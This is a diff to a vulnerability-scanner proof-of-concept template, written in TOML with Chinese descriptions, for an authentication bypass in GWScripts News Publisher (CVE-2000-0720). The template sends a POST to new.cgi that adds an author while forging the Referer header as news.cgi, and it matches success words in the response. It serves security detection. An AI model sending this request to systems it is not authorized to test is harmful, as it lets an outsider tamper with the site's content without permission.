@@ -1,17 +1,22 @@
 [info]
-author = "ave"
-description = "向 new.cgi 发送 POST 请求，携带 addAuthor 参数并伪造 Referer 头为 news.cgi，验证是否可未授权添加作者"
+author = "AVE"
+description = "检测 GWScripts News Publisher 的 news.cgi 是否存在未授权添加作者漏洞。通过向 new.cgi 发送包含 addAuthor 参数的 POST 请求并伪造 Referer 头，验证是否可绕过身份验证添加作者。"
 id = "POC-AVE-2000-0561"
-name = "GWScripts News Publisher 1.0 认证绕过 PoC"
+name = "GWScripts News Publisher 未授权添加作者 PoC"
 severity = "medium"
-tags = ["ave-2000-0561"]
+tags = [
+    "cve-2000-0720",
+    "gwscripts",
+    "news-publisher",
+    "cgi",
+]
 vuln_id = [
     "CVE-2000-0720",
     "AVE-2000-0561",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
@@ -19,19 +24,20 @@ path = "/{{BaseURL}}/new.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "addAuthor=1&authorName=testpoc&authorEmail=test@test.com"
+content = "addAuthor=1&author_name=ave_test&author_email=test@ave.com"
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
 Referer = "{{BaseURL}}/news.cgi"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "Author",
+    "author",
     "added",
     "success",
 ]
